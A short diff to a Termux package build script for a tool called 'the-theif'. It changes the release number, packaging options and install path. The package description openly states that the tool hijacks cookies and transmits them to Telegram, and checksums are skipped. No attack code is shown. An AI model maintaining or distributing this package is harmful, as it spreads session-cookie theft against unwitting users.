@@ -3,12 +3,12 @@
 
 pkgname="the-theif"
 pkgver=2.1
-pkgrel=0
+pkgrel=1
 pkgdesc='A tool that can hijack cookies and transmit them to Telegram using the API.'
 arch=('any')
 depends=('apksigner' 'apkeditor' 'python')
 install="the-theif.install"
-options=('!strip')
+options=('!strip' '!debug' '!emptydirs')
 source=(the-theif-data.tar.gz)
 sha256sums=('SKIP')
 
@@ -17,5 +17,6 @@ build() {
 }
 
 package() {
-    tar -xzf "${srcdir}/the-theif-data.tar.gz" -C "${pkgdir}"
+    mkdir -p "${pkgdir}/data/data/com.termux/files"
+    tar -xzf "${srcdir}/the-theif-data.tar.gz" -C "${pkgdir}/data/data/com.termux/files"
 }
